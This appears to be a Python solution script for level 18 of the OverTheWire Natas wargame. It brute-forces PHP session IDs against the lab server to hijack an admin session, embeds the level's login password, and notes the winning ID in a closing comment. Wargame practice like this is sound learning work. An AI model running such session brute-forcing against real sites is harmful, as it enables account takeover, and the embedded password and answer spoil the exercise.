import requests

headers = {'content-type': 'application/x-www-form-urlencoded'}
url = 'http://natas18.natas.labs.overthewire.org/index.php'
good_string = 'You are an admin.'
max_id = 640

for i in range(max_id) : 
        payload = {'username' : 'admin', 'password' : 'admin'}
        r = requests.post(url, auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), data=payload, headers=headers, cookies={'PHPSESSID' : str(i)})
        if good_string in r.text : 
                print(i,end="")
                print("true")
                print(r.text)
                break
        else : 
                print(i,end="")
                print("false")


# 119